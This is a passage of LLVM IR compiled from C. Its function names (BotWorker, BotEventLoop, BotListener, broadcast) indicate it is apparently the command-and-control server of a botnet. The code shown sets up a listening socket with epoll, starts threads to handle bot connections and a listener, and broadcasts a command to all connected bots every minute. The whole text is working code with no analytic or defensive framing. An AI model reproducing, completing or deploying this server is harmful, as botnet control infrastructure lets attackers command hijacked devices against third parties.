  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.74, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.75, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.76, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %23
  call void @abort() #11
  unreachable

40:                                               ; preds = %23
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @make_socket_non_blocking(i32 %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @abort() #11
  unreachable

46:                                               ; preds = %40
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = call i32 @listen(i32 %47, i32 4096) #9
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i64 0, i64 0))
  call void @abort() #11
  unreachable

52:                                               ; preds = %46
  %53 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %53, i32* @epollFD, align 4
  %54 = load volatile i32, i32* @epollFD, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.78, i64 0, i64 0))
  call void @abort() #11
  unreachable

57:                                               ; preds = %52
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  store i32 %58, i32* %60, align 1
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %61, align 1
  %62 = load volatile i32, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @listenFD, align 4
  %64 = call i32 @epoll_ctl(i32 %62, i32 1, i32 %63, %struct.epoll_event* %11) #9
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %57
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 2
  %71 = zext i32 %70 to i64
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %12, align 8
  %73 = alloca i64, i64 %71, align 16
  store i64 %71, i64* %13, align 8
  br label %74

74:                                               ; preds = %78, %68
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %75, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %74
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i64, i64* %73, i64 %81
  %83 = call i32 @pthread_create(i64* %82, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %74, !llvm.loop !20

84:                                               ; preds = %74
  %85 = getelementptr inbounds i64, i64* %73, i64 0
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = call i32 @pthread_create(i64* %85, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %88) #9
  br label %90

90:                                               ; preds = %91, %84
  br label %91

91:                                               ; preds = %90
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i64 0, i64 0))
  %92 = call i32 @sleep(i32 60)
  br label %90
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.83, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
